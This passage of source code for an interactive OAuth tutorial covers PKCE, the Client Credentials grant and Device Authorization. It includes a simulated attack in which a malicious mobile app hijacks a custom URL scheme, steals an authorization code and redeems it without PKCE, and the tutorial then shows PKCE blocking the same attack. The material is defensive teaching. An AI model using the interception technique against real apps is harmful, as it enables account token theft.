              <tr><td>③</td><td>App → AS (direct POST)</td><td><code>code_verifier</code></td><td>No (TLS back-channel)</td></tr>
              <tr><td>verdict</td><td>AS</td><td>SHA256 → base64url → compare with the stored challenge</td><td>-</td></tr>
            </table>
            <p>Click <b>Use RFC 7636 example</b>: the challenge is <code>E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM</code>, the test vector from
            RFC 7636 Appendix B, computed live by the widget's SHA-256.</p>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>Change one character of the verifier: the whole challenge changes (avalanche effect).</li>
              <li>Pick each 😈 option in card ③. All three get <code>invalid_grant</code>. "Sends the challenge" fails too, because the AS hashes whatever it receives.</li>
              <li>Delete characters until the verifier is shorter than 43: it's flagged invalid (RFC 7636 §4.1).</li>
              <li>Compare the hex and base64url rows: same 32 bytes, different encodings. PKCE uses base64url <em>without</em> <code>=</code> padding.</li>
            </ul>
          </details>
        `,
      },
      {
        title: 'Interception attack: without vs with PKCE',
        code: W(`<div id="flow"></div>`, function () {
          const ver = Auth.randB64url(32), ch = Auth.sha256b64url(ver);
          const code = Auth.randB64url(16), CB = 'com.printapp:/cb';
          const base = { response_type: 'code', client_id: 'printapp-ios', redirect_uri: CB, scope: 'photos.read', state: 'q8Zt' };
          const actors = [
            { id: 'app', label: 'PrintApp (iOS)', icon: '📱', store: {} },
            { id: 'evil', label: 'Malicious app', icon: '😈', store: { registered: 'com.printapp:// too!' } },
            { id: 'br', label: 'System browser / OS', icon: '🌐', store: {} },
            { id: 'as', label: 'Auth Server', icon: '🛂', store: { 'printapp-ios': 'public client (no secret)' } },
          ];
          const stolenRedirect = (n) => [
            { from: 'as', to: 'br', kind: 'redirect', label: '302 → com.printapp:/cb?code=…', msg: 'HTTP/1.1 302 Found\nLocation: ' + CB + '?' + form({ code, state: 'q8Zt' }), hl: ['code=' + code],
              note: 'The AS redirects to the custom scheme. The <b>OS</b> decides which app opens it.' },
            { from: 'br', to: 'evil', kind: 'redirect', label: 'OS hands URL to the WRONG app', msg: '# iOS/Android: two apps claim "com.printapp"\n# the malicious one wins the race\n' + CB + '?code=' + code,
              set: { evil: { 'stolen code': code.slice(0, 10) + '…' } }, note: 'Custom URL schemes are first-come / OS-chosen, not owned. The malicious app now has the code.' + (n || '') },
          ];
          const noPkce = [
            { from: 'app', to: 'br', kind: 'redirect', label: 'open /authorize (no PKCE)', msg: 'GET /authorize?' + form(base) + ' HTTP/1.1\nHost: accounts.megacorp.example' },
            { from: 'br', to: 'as', label: 'GET /authorize', msg: 'GET /authorize?' + form(base) + ' HTTP/1.1\nHost: accounts.megacorp.example' },
            { from: 'as', to: 'br', kind: 'res', label: 'login + consent', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n# Alice signs in and taps Allow',
              set: { as: { ['code ' + code.slice(0, 8)]: 'alice, no challenge' } } },
          ].concat(stolenRedirect(), [
            { from: 'evil', to: 'as', kind: 'back', label: 'POST /token with stolen code', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ grant_type: 'authorization_code', code, client_id: 'printapp-ios', redirect_uri: CB }),
              note: 'Public client: there is no secret to check. The <code>client_id</code> is public knowledge.' },
            { from: 'as', to: 'evil', kind: 'res', label: '200 access_token 😱', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n{"access_token":"mc_at_ALICE","token_type":"Bearer","expires_in":3600,"refresh_token":"mc_rt_ALICE"}',
              set: { evil: { 'access_token': "Alice's 😱" } }, note: 'The AS has no way to tell the thief from the real app. <b>Attack succeeds.</b>' },
          ]);
          const authzP = form(Object.assign({}, base, { code_challenge: ch, code_challenge_method: 'S256' }));
          const pkceStart = [
            { from: 'app', to: 'app', label: 'make verifier + challenge', set: { app: { code_verifier: ver } },
              note: 'Fresh for this login: <code>code_verifier=' + ver + '</code>, so <code>code_challenge=BASE64URL(SHA256(verifier))=' + ch + '</code>.' },
            { from: 'app', to: 'br', kind: 'redirect', label: 'open /authorize + code_challenge', msg: 'GET /authorize?' + authzP + ' HTTP/1.1\nHost: accounts.megacorp.example', hl: ['code_challenge=' + ch, 'code_challenge_method=S256'] },
            { from: 'br', to: 'as', label: 'GET /authorize', msg: 'GET /authorize?' + authzP + ' HTTP/1.1\nHost: accounts.megacorp.example' },
            { from: 'as', to: 'br', kind: 'res', label: 'login + consent', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n# Alice signs in and taps Allow',
              set: { as: { ['code ' + code.slice(0, 8)]: 'alice, challenge=' + ch.slice(0, 10) + '…' } }, note: 'The AS stores the challenge together with the code it is about to issue.' },
          ];
          const thief = pkceStart.concat(stolenRedirect(' But it never saw the verifier.'), [
            { from: 'evil', to: 'as', kind: 'back', label: 'POST /token (no verifier)', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ grant_type: 'authorization_code', code, client_id: 'printapp-ios', redirect_uri: CB }),
              note: 'The thief has the code but only saw the <em>challenge</em> in the URL, and SHA-256 can\'t be reversed.' },
            { from: 'as', to: 'as', label: 'verifier missing / hash ≠ challenge' },
            { from: 'as', to: 'evil', kind: 'err', label: '400 invalid_grant 🛡', msg: 'HTTP/1.1 400 Bad Request\nContent-Type: application/json\nCache-Control: no-store\n\n{"error":"invalid_grant","error_description":"PKCE verification failed"}',
              hl: ['invalid_grant'], note: '<b>Attack fails.</b> The stolen code is worthless without the verifier.' },
          ]);
          const legit = pkceStart.concat([
            { from: 'as', to: 'br', kind: 'redirect', label: '302 → com.printapp:/cb?code=…', msg: 'HTTP/1.1 302 Found\nLocation: ' + CB + '?' + form({ code, state: 'q8Zt' }) },
            { from: 'br', to: 'app', kind: 'redirect', label: 'OS opens PrintApp', msg: CB + '?code=' + code + '&state=q8Zt' },
            { from: 'app', to: 'as', kind: 'back', label: 'POST /token + code_verifier', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ grant_type: 'authorization_code', code, client_id: 'printapp-ios', redirect_uri: CB, code_verifier: ver }),
              hl: ['code_verifier=' + ver] },
            { from: 'as', to: 'as', label: 'SHA256(verifier) == challenge ✓', note: 'BASE64URL(SHA256("' + ver + '")) = <code>' + Auth.sha256b64url(ver) + '</code>, which equals the stored challenge.' },
            { from: 'as', to: 'app', kind: 'res', label: '200 tokens', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n{"access_token":"mc_at_x8…","token_type":"Bearer","expires_in":3600,"refresh_token":"mc_rt_k2…"}',
              set: { app: { code_verifier: null, access_token: 'mc_at_x8… ✅' } } },
          ]);
          Seq.mount('#flow', {
            title: 'Authorization code interception (RFC 7636 §1)',
            actors,
            scenarios: [{ name: '❌ No PKCE: code stolen', steps: noPkce }, { name: '🛡 PKCE: thief gets invalid_grant', steps: thief }, { name: '✅ PKCE: real app redeems', steps: legit }],
          });
        }),
        explain: `
          <details>
            <summary>The problem: custom URL schemes are not owned</summary>
            <p>On mobile, <code>com.printapp:/cb</code> isn't verified like a domain. Two apps can register it, and the OS picks one. Desktop apps
            listening on <code>http://127.0.0.1:port</code> have a similar issue. A <strong>public client</strong> has no secret, so in the first tab the token endpoint
            can't tell the thief from the real app.</p>
            <table>
              <tr><th>Step</th><th>❌ No PKCE</th><th>🛡 With PKCE</th></tr>
              <tr><td>Before redirect</td><td>nothing</td><td>app keeps <code>code_verifier</code>, sends <code>code_challenge</code></td></tr>
              <tr><td>Code stolen</td><td>thief has code</td><td>thief has code + challenge (useless)</td></tr>
              <tr><td>POST /token</td><td>code + client_id → <b>200 tokens</b></td><td>code + no valid verifier → <b>400 invalid_grant</b></td></tr>
            </table>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li>PKCE is a <strong>per-request secret</strong>. It works even for apps that can't store a long-term secret.</li>
              <li>The AS ties the challenge to the <em>code</em>. Only whoever started the flow can finish it.</li>
              <li>It complements, not replaces, <code>state</code> and exact <code>redirect_uri</code> matching. Native apps should also prefer claimed <code>https</code> redirects (Universal Links / App Links) over custom schemes (RFC 8252).</li>
            </ul>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>Step through tab 1 to step 5 and watch the 😈 card fill with the stolen code, then the stolen token at step 7.</li>
              <li>In tab 2, click step 2 and look for <code>code_challenge</code>: that's all the thief could ever see. Steps 8–9 are the check and the rejection.</li>
              <li>In tab 3, click step 8: the note shows the live SHA-256 of the verifier matching the challenge from step 1.</li>
            </ul>
          </details>
        `,
      },
    ],
    quiz: [
      { q: 'What does the app send in the <code>/authorize</code> request?',
        options: ['code_verifier', 'code_challenge (the hash) and code_challenge_method=S256', 'client_secret', 'Both verifier and challenge'],
        answer: 1, why: 'Only the hash goes through the front channel. The verifier is revealed later, directly to the token endpoint.' },
      { q: 'How is the S256 <code>code_challenge</code> computed?',
        options: ['hex(SHA256(verifier))', 'BASE64URL(SHA256(ASCII(verifier))) without padding', 'base64(verifier)', 'HMAC(client_secret, verifier)'],
        answer: 1, why: 'RFC 7636 §4.2: BASE64URL-ENCODE(SHA256(ASCII(code_verifier))), with no "=" padding.' },
      { q: 'A thief intercepts the code but not the verifier. What does <code>/token</code> return?',
        options: ['200 with tokens', '400 invalid_grant', '401 invalid_client', '302 to the login page'],
        answer: 1, why: 'The verifier is missing or does not hash to the stored challenge, so the grant is invalid.' },
      { q: 'Per RFC 9700 (2025), who should use PKCE?',
        options: ['Only mobile apps', 'Only SPAs', 'Public clients MUST; it is RECOMMENDED for confidential clients too', 'Nobody; it was replaced by DPoP'],
        answer: 2, why: 'PKCE also prevents authorization-code injection, which client secrets cannot. The OAuth 2.1 draft builds it into the code flow.' },
      { q: 'Why is <code>code_challenge_method=plain</code> discouraged?',
        options: ['It is slower', 'The challenge equals the verifier, so anyone who sees the authorization URL learns the verifier', 'It is not URL-safe', 'Servers do not support it'],
        answer: 1, why: 'With plain, the "hash" is the secret itself, so a leaked authorization request gives it away. Always use S256.' },
    ],
    exercise: {
      task: `<p>A native app generated the <code>code_verifier</code> shown in the box below. Use the tool to compute the right
        <code>code_challenge</code>, fill in both PKCE parameters, then click <strong>Check</strong>.</p>`,
      hint: 'S256 means SHA-256, then base64url (- instead of +, _ instead of /, and no = padding). The hex form and standard base64 are both wrong.',
      starter: W(`<div id="ex"></div>`, exPkce, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exPkce, '', { fill: true }),
    },
  });

  function exPkce() {
    const V = 'Sk3wQ9-vN_r7aZ2pL0xT5mYcB8dE1fG6hJ4kU-oWq.i~Zr';
    const want = Auth.sha256b64url(V);
    $('#ex').innerHTML = '<div class="card"><b>code_verifier</b> <code>' + V + '</code> <span class="muted">(' + V.length + ' chars)</span></div>' +
      '<div class="card"><h4>🧰 Tool</h4><div class="row"><input id="ti" class="mono" style="flex:1" placeholder="paste text here">' +
      '<select id="op"><option value="hex">SHA-256 → hex</option><option value="b64">SHA-256 → base64</option>' +
      '<option value="b64url">SHA-256 → base64url</option><option value="plain">base64url(text) (no hash)</option></select></div>' +
      '<pre class="lite" id="to">(output)</pre></div>' +
      '<div class="card"><h4>Your authorization request params</h4><div class="mono" style="display:grid;grid-template-columns:auto 1fr;gap:4px 8px;align-items:center">' +
      '<span>code_challenge=</span><input id="c" class="mono"><span>code_challenge_method=</span><input id="m" class="mono"></div>' +
      '<button class="primary" id="chk" style="margin-top:6px">Check</button><div class="fb" id="fb"></div></div>';
    const run = () => {
      const t = $('#ti').value, op = $('#op').value;
      $('#to').textContent = !t ? '(output)' : op === 'hex' ? Auth.sha256hex(t) : op === 'b64' ? Auth.b64(Auth.sha256(t)) : op === 'b64url' ? Auth.sha256b64url(t) : Auth.b64url(t);
    };
    $('#ti').oninput = run; $('#op').onchange = run;
    if (DATA.fill) { $('#ti').value = V; $('#op').value = 'b64url'; run(); $('#c').value = want; $('#m').value = 'S256'; }
    $('#chk').onclick = () => {
      const c = $('#c').value.trim(), m = $('#m').value.trim();
      const errs = [];
      if (m !== 'S256') errs.push(m === 'plain' ? '<code>plain</code> gives no protection; use <code>S256</code>.' : 'Method must be exactly <code>S256</code> (case-sensitive).');
      if (c !== want) {
        if (c === Auth.sha256hex(V)) errs.push('That\'s the <b>hex</b> digest. PKCE uses base64url.');
        else if (c === Auth.b64(Auth.sha256(V))) errs.push('That\'s <b>standard base64</b> (with <code>+ / =</code>). Use base64url: <code>-</code>, <code>_</code>, no padding.');
        else if (c === V || c === Auth.b64url(V)) errs.push('You didn\'t hash it. The challenge is the SHA-256 of the verifier.');
        else errs.push('code_challenge doesn\'t match BASE64URL(SHA256(verifier)). Did you copy the verifier exactly (including <code>.</code> and <code>~</code>)?');
      }
      if (errs.length) return feedback($('#fb'), false, '❌ ' + errs.join('<br>'));
      feedback($('#fb'), true, '✅ Correct: <code>code_challenge=' + want + '&amp;code_challenge_method=S256</code>. The verifier stays in the app until the POST /token.');
    };
  }

  // ───────────────────────────── 6. client-credentials ─────────────────────────────
  L.push({
    id: 'client-credentials',
    section: SECTION,
    title: 'Client Credentials (machine-to-machine)',
    explain: `
      <p>Sometimes there is <strong>no user at all</strong>: a nightly billing job calls the Invoices API, or one microservice calls another.
      There is nobody to redirect and nobody to give consent. The client acts <em>as itself</em>, using the
      <strong>Client Credentials grant</strong> (RFC 6749 §4.4).</p>
      <pre><code class="language-http">POST /token HTTP/1.1
Host: auth.example.com
Authorization: Basic YmlsbGluZy1zdmM6N2ZKcTJ4THBXOQ==      ← base64("billing-svc:7fJq2xLpW9")
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&amp;scope=invoices.read%20invoices.write</code></pre>
      <pre><code class="language-http">HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{ "access_token": "eyJhbGciOi...", "token_type": "Bearer", "expires_in": 300,
  "scope": "invoices.read invoices.write" }</code></pre>
      <ul>
        <li><strong>One request</strong>: no <code>/authorize</code>, no browser, no redirect, no code.</li>
        <li><strong>No refresh token</strong> (RFC 6749 says the AS SHOULD NOT issue one). When the token expires, the client just asks again with its credentials.</li>
        <li>The token's subject is the <strong>client itself</strong>. In a JWT access token, <code>sub</code> (or <code>client_id</code>) is the service, not a person.</li>
        <li>Only <strong>confidential clients</strong> may use it, since the credentials are the whole proof of identity.</li>
      </ul>
      <h3>Ways for the client to authenticate</h3>
      <ul>
        <li><code>client_secret_basic</code>: HTTP Basic with <code>client_id:client_secret</code> (most common).</li>
        <li><code>client_secret_post</code>: <code>client_id</code> and <code>client_secret</code> in the form body.</li>
        <li><code>private_key_jwt</code> (RFC 7523 / OIDC): the client signs a short JWT with its <strong>private key</strong> and sends it as
        <code>client_assertion</code>. No shared secret is stored at the AS, only a public key. This is the preferred option for high-security setups.</li>
        <li><code>tls_client_auth</code> (mTLS, RFC 8705): the client proves itself with a TLS client certificate.</li>
      </ul>
      <div class="tip"><strong>Cache the token.</strong> Fetch a token once, reuse it until shortly before <code>expires_in</code> runs out,
      then fetch a new one. Requesting a token for every API call hammers the AS and adds latency.</div>
      <div class="warn">Don't use client credentials to act "on behalf of" a user by passing a user ID in a parameter. Then any compromised
      service can impersonate anyone. For user-delegated calls between services, look at token exchange (RFC 8693).</div>
    `,
    examples: [
      {
        title: 'Service-to-service: token, cache, errors, private_key_jwt',
        code: W(`<div id="flow"></div>`, function () {
          const TOKEN_URL = 'https://auth.example.com/token';
          const now = Math.floor(Date.now() / 1000);
          const basic = Auth.b64('billing-svc:7fJq2xLpW9');
          const jwt = Auth.jwtSign({ alg: 'HS256', typ: 'at+jwt', kid: 'demo' }, {
            iss: 'https://auth.example.com', sub: 'billing-svc', client_id: 'billing-svc', aud: 'https://invoices.example.com',
            scope: 'invoices.read invoices.write', iat: now, exp: now + 300, jti: Auth.randHex(8) }, 'demo-signing-key');
          const tokReq = 'POST /token HTTP/1.1\nHost: auth.example.com\nAuthorization: Basic ' + basic + '\nContent-Type: application/x-www-form-urlencoded\n\n' +
            form({ grant_type: 'client_credentials', scope: 'invoices.read invoices.write' });
          const tokRes = 'HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n' +
            pj({ access_token: jwt, token_type: 'Bearer', expires_in: 300, scope: 'invoices.read invoices.write' });
          const actors = [
            { id: 's', label: 'Billing service (cron)', icon: '⚙', store: { client_id: 'billing-svc', client_secret: '7fJq2xLpW9' }, storeLabel: 'billing-svc' },
            { id: 'as', label: 'Auth Server', icon: '🛂', store: { 'billing-svc may get': 'invoices.read invoices.write' }, storeLabel: 'auth.example.com' },
            { id: 'api', label: 'Invoices API', icon: '🧾', store: { expects: 'aud=https://invoices.example.com' }, storeLabel: 'invoices.example.com' },
          ];
          const ok = [
            { from: 's', to: 's', label: '02:00 job starts, token cache empty', note: 'No user is involved. The service needs a token for itself.' },
            { from: 's', to: 'as', kind: 'back', label: 'POST /token grant_type=client_credentials', msg: tokReq, hl: ['grant_type=client_credentials', 'Authorization'],
              note: '<code>Basic ' + basic + '</code> is base64("billing-svc:7fJq2xLpW9"). This one request replaces the whole browser dance.' },
            { from: 'as', to: 'as', label: 'check secret + allowed scopes', note: 'The AS checks the client secret, then that <code>billing-svc</code> is allowed to get the requested scopes.' },
            { from: 'as', to: 's', kind: 'back', label: '200 {access_token, expires_in:300}', msg: tokRes,
              set: { s: { 'cached token': 'eyJ… (exp in 300s)' } },
              note: 'There is <b>no refresh_token</b>: the service can always ask again. This access token is a real JWT (HS256 here for the demo; real servers typically sign with RS256/ES256). Decode its payload: <code>sub = billing-svc</code>.' },
            { from: 's', to: 'api', label: 'GET /v1/invoices?status=unpaid', msg: 'GET /v1/invoices?status=unpaid HTTP/1.1\nHost: invoices.example.com\nAuthorization: Bearer ' + jwt, hl: ['Bearer'] },
            { from: 'api', to: 'api', label: 'verify sig, exp, aud, scope ∋ invoices.read', note: 'The API validates the JWT locally: signature, <code>iss</code>, <code>exp</code>, <code>aud</code>, and that <code>scope</code> contains <code>invoices.read</code>.' },
            { from: 'api', to: 's', kind: 'res', label: '200 [invoices]', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n[{"id":"inv_77","amount":120.5,"status":"unpaid"}]' },
            { from: 's', to: 's', label: 'reuse cached token', note: 'Token still valid, so no new /token call.' },
            { from: 's', to: 'api', label: 'POST /v1/invoices/inv_77/remind', msg: 'POST /v1/invoices/inv_77/remind HTTP/1.1\nHost: invoices.example.com\nAuthorization: Bearer ' + jwt.slice(0, 24) + '…' },
            { from: 'api', to: 's', kind: 'res', label: '202 Accepted', msg: 'HTTP/1.1 202 Accepted' },
          ];
          const errs = [
            { from: 's', to: 'as', kind: 'back', label: 'POST /token (wrong secret)', msg: 'POST /token HTTP/1.1\nHost: auth.example.com\nAuthorization: Basic ' + Auth.b64('billing-svc:oldsecret') + '\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=client_credentials&scope=invoices.read',
              note: 'The secret was rotated but this server still has the old one.' },
            { from: 'as', to: 's', kind: 'err', label: '401 invalid_client', msg: 'HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm="auth.example.com"\nContent-Type: application/json\nCache-Control: no-store\n\n{"error":"invalid_client","error_description":"client authentication failed"}', hl: ['invalid_client'] },
            { from: 's', to: 'as', kind: 'back', label: 'POST /token scope=invoices.delete', msg: 'POST /token HTTP/1.1\nHost: auth.example.com\nAuthorization: Basic ' + basic + '\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=client_credentials&scope=invoices.delete' },
            { from: 'as', to: 's', kind: 'err', label: '400 invalid_scope', msg: 'HTTP/1.1 400 Bad Request\nContent-Type: application/json\nCache-Control: no-store\n\n{"error":"invalid_scope","error_description":"billing-svc may not request invoices.delete"}', hl: ['invalid_scope'],
              note: 'Each client has an allow-list of scopes. Least privilege.' },
            { from: 's', to: 'api', label: 'GET /v1/invoices (token 6 min old)', msg: 'GET /v1/invoices HTTP/1.1\nHost: invoices.example.com\nAuthorization: Bearer ' + jwt.slice(0, 24) + '…' },
            { from: 'api', to: 's', kind: 'err', label: '401 invalid_token (expired)', msg: 'HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer error="invalid_token", error_description="The access token expired"', hl: ['invalid_token'],
              set: { s: { 'cached token': null } }, note: 'RFC 6750 error at the resource server. Fix: drop the cached token, fetch a new one, retry once. (Better: refresh slightly <em>before</em> <code>exp</code>.)' },
          ];
          const hdr = Auth.b64url(JSON.stringify({ alg: 'RS256', typ: 'JWT', kid: 'billing-2026-01' }));
          const pl = Auth.b64url(JSON.stringify({ iss: 'billing-svc', sub: 'billing-svc', aud: TOKEN_URL, jti: Auth.randHex(8), iat: now, exp: now + 60 }));
          const assertion = hdr + '.' + pl + '.<RS256-signature-by-billing-svc-private-key>';
          const pkj = [
            { from: 's', to: 's', label: 'sign client_assertion JWT (private key)', set: { s: { client_secret: null, private_key: 'billing-2026-01 (never leaves)' } },
              note: 'Instead of a shared secret, the service holds a <b>private key</b>. It signs a short-lived JWT: <code>iss = sub = billing-svc</code>, <code>aud = token endpoint</code>, unique <code>jti</code>, <code>exp</code> in 60 s. (The signature part is a placeholder: this demo library has no RSA.)' },
            { from: 's', to: 'as', kind: 'back', label: 'POST /token + client_assertion', msg: 'POST /token HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\n' +
              form({ grant_type: 'client_credentials', scope: 'invoices.read', client_assertion_type: 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer', client_assertion: assertion }),
              hl: ['client_assertion_type', 'client_assertion='], note: 'No <code>Authorization: Basic</code> header. The signed JWT <em>is</em> the client authentication.' },
            { from: 'as', to: 'as', label: 'verify with registered public key (JWKS)', set: { as: { 'billing-svc public key': 'kid billing-2026-01' } },
              note: 'The AS only stores a <b>public</b> key, so a leak of the AS database doesn\'t expose anything usable. It also checks <code>aud</code>, <code>exp</code> and that <code>jti</code> wasn\'t seen before (replay).' },
            { from: 'as', to: 's', kind: 'back', label: '200 {access_token…}', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n{"access_token":"eyJ…","token_type":"Bearer","expires_in":300,"scope":"invoices.read"}' },
          ];
          Seq.mount('#flow', {
            title: 'Client Credentials grant (RFC 6749 §4.4)',
            actors,
            scenarios: [{ name: '✅ client_secret_basic + caching', steps: ok }, { name: '❌ Errors', steps: errs }, { name: '🔐 private_key_jwt', steps: pkj }],
          });
        }),
        explain: `
          <details>
            <summary>Step by step (✅ tab)</summary>
            <table>
              <tr><th>#</th><th>What happens</th><th>Service's token cache</th></tr>
              <tr><td>1</td><td>Job starts</td><td>empty</td></tr>
              <tr><td>2–4</td><td>One back-channel POST with Basic auth → JSON with <code>expires_in: 300</code>, no refresh token</td><td><code>eyJ… (exp in 300s)</code></td></tr>
              <tr><td>5–7</td><td>API validates the JWT: sig, <code>exp</code>, <code>aud</code>, <code>scope</code> → 200</td><td>same</td></tr>
              <tr><td>8–10</td><td>Second call reuses the cached token → 202</td><td>same</td></tr>
            </table>
            <p>The <b>❌ Errors</b> tab shows the three errors you will actually see: <code>invalid_client</code> (401, bad credentials),
            <code>invalid_scope</code> (400, scope not allowed for this client) and an expired token at the API (401
            <code>WWW-Authenticate: Bearer error="invalid_token"</code>).</p>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li>The client <em>is</em> the resource owner here: permissions come from the client's registration, not from user consent.</li>
              <li>Protect the credentials like a database password: secrets manager, rotation, never in git.</li>
              <li><code>private_key_jwt</code> and mTLS avoid shared secrets entirely; the AS only stores public keys.</li>
            </ul>
          </details>
        `,
      },
    ],
    quiz: [
      { q: 'Which request does the Client Credentials grant use?',
        options: ['GET /authorize then POST /token', 'A single POST /token with grant_type=client_credentials and client authentication', 'POST /device_authorization', 'GET /token?client_secret=…'],
        answer: 1, why: 'There is no user and no browser, just one back-channel token request.' },
      { q: 'Why is there usually no refresh token in a client credentials response?',
        options: ['Refresh tokens are deprecated', 'The client can simply authenticate again with its own credentials', 'JWTs can\'t be refreshed', 'It would be too long'],
        answer: 1, why: 'A refresh token exists so a user doesn\'t have to log in again. Here the client already holds long-term credentials.' },
      { q: 'The client sends a wrong secret. What does /token return?',
        options: ['400 invalid_grant', '401 invalid_client', '403 insufficient_scope', '200 with an empty token'],
        answer: 1, why: 'Client authentication failures are invalid_client (401 when the client used the Authorization header).' },
      { q: 'What is the main advantage of <code>private_key_jwt</code> over a client secret?',
        options: ['Tokens last longer', 'The AS only stores a public key, and no shared secret is sent over the wire', 'It doesn\'t need HTTPS', 'It works without an AS'],
        answer: 1, why: 'The client proves possession of a private key by signing a short-lived assertion; nothing reusable is transmitted or stored server-side.' },
    ],
    exercise: {
      task: `<p>Write the raw HTTP token request for a reporting bot, using <code>client_secret_basic</code>. The details are in the box below.
        Type the request, then click <strong>Check</strong>.</p>`,
      hint: 'Request line: POST /oauth2/token HTTP/1.1, then Host, Authorization: Basic <base64 of id:secret>, Content-Type: application/x-www-form-urlencoded, a blank line, then the body grant_type=client_credentials&scope=reports.read',
      starter: W(`<div id="ex"></div>`, exCC, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exCC, '', { fill: true }),
    },
  });

  function exCC() {
    const ID = 'report-bot', SEC = 'rb-s3cret-2026';
    const B = Auth.b64(ID + ':' + SEC);
    $('#ex').innerHTML = '<div class="card"><table class="t"><tr><td>Token endpoint</td><td><code>https://auth.example.com/oauth2/token</code></td></tr>' +
      '<tr><td>client_id</td><td><code>' + ID + '</code></td></tr><tr><td>client_secret</td><td><code>' + SEC + '</code></td></tr>' +
      '<tr><td>scope</td><td><code>reports.read</code></td></tr></table>' +
      '<div class="row" style="margin-top:6px">🧰 base64 helper: <input id="bi" class="mono" placeholder="text to encode" style="flex:1"> → <code id="bo"></code></div></div>' +
      '<textarea id="r" rows="7" placeholder="POST ... HTTP/1.1"></textarea><button class="primary" id="chk">Check</button><div class="fb" id="fb"></div>';
    $('#bi').oninput = () => ($('#bo').textContent = $('#bi').value ? Auth.b64($('#bi').value) : '');
    if (DATA.fill) $('#r').value = 'POST /oauth2/token HTTP/1.1\nHost: auth.example.com\nAuthorization: Basic ' + B +
      '\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=client_credentials&scope=reports.read';
    $('#chk').onclick = () => {
      const r = parseHttp($('#r').value), e = [];
      if (r.method !== 'POST') e.push('Method must be <code>POST</code> (never GET: credentials would land in logs).');
      if (r.path !== '/oauth2/token') e.push('Path should be <code>/oauth2/token</code>.');
      if ((r.headers.host || '') !== 'auth.example.com') e.push('Add <code>Host: auth.example.com</code>.');
      const a = r.headers.authorization || '';
      if (!/^Basic\s+/i.test(a)) e.push('Add <code>Authorization: Basic …</code> (client_secret_basic).');
      else {
        const v = a.replace(/^Basic\s+/i, '');
        let d = ''; try { d = Auth.b64d(v); } catch (x) { d = '(not valid base64)'; }
        if (v !== B) e.push('Basic value decodes to <code>' + esc(d) + '</code>; it should be base64("' + ID + ':' + SEC + '").');
      }
      if (!/^application\/x-www-form-urlencoded/i.test(r.headers['content-type'] || '')) e.push('Content-Type must be <code>application/x-www-form-urlencoded</code> (not JSON).');
      const body = new URLSearchParams(r.body);
      if (body.get('grant_type') !== 'client_credentials') e.push('Body needs <code>grant_type=client_credentials</code>.');
      if (body.get('scope') !== 'reports.read') e.push('Body needs <code>scope=reports.read</code>.');
      if (body.get('client_secret')) e.push('With client_secret_basic, the secret goes only in the header, not also in the body.');
      if (e.length) return feedback($('#fb'), false, '❌ Not yet:<ul><li>' + e.join('</li><li>') + '</li></ul>');
      feedback($('#fb'), true, '✅ Perfect. The AS would answer <code>200 {"access_token":"…","token_type":"Bearer","expires_in":…,"scope":"reports.read"}</code>, with no refresh token.');
    };
  }

  // ───────────────────────────── 7. device-flow ─────────────────────────────
  L.push({
    id: 'device-flow',
    section: SECTION,
    title: 'Device Authorization flow',
    explain: `
      <p>Logging in on a smart TV with a remote control is painful, and a CLI tool or an IoT gadget may have no browser at all. The
      <strong>Device Authorization Grant</strong> (<strong>RFC 8628</strong>, 2019) splits the work: the device shows a short code, and you
      approve it on your <strong>phone or laptop</strong>, which has a real browser and keyboard. You've used it if you've ever seen
      <em>"Go to example.com/activate and enter WDJB-MJHT"</em>, or run <code>gh auth login</code> or <code>az login --use-device-code</code>.</p>
      <h3>1. The device asks for codes</h3>
      <pre><code class="language-http">POST /device_authorization HTTP/1.1
Host: accounts.megacorp.example
Content-Type: application/x-www-form-urlencoded

client_id=tv-streamer&amp;scope=profile%20watch</code></pre>
      <pre><code class="language-json">{ "device_code": "GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS",
  "user_code": "WDJB-MJHT",
  "verification_uri": "https://megacorp.example/device",
  "verification_uri_complete": "https://megacorp.example/device?user_code=WDJB-MJHT",
  "expires_in": 1800, "interval": 5 }</code></pre>
      <ul>
        <li><code>device_code</code>: long and secret, known only to the device. It's used for polling.</li>
        <li><code>user_code</code>: short and easy to type; the user enters it on the phone.</li>
        <li><code>verification_uri</code>: where the user goes. <code>verification_uri_complete</code> already contains the code, which is handy for a QR code.</li>
        <li><code>interval</code>: the minimum number of seconds between polls (default 5).</li>
      </ul>
      <h3>2. The device polls the token endpoint</h3>
      <pre><code class="language-http">POST /token HTTP/1.1
Host: accounts.megacorp.example
Content-Type: application/x-www-form-urlencoded

grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Adevice_code
&amp;device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS&amp;client_id=tv-streamer</code></pre>
      <table>
        <tr><th>Response</th><th>Meaning</th><th>What the device does</th></tr>
